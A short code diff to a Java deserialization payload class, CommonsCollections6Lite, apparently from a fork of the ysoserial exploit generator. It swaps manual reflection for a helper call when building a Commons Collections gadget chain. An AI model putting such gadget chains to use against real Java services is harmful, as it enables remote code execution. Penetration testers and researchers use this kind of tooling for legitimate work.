@@ -7,6 +7,7 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
+import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.cc.TransformerUtil;
 
 import java.lang.reflect.Field;
@@ -30,9 +31,7 @@ public class CommonsCollections6Lite implements ObjectPayload<Object> {
 		expMap.put(tme, "su18");
 		outerMap.remove("su18");
 
-		Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
-		f.setAccessible(true);
-		f.set(transformerChain, transformers);
+		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 		return expMap;
 	}
 }
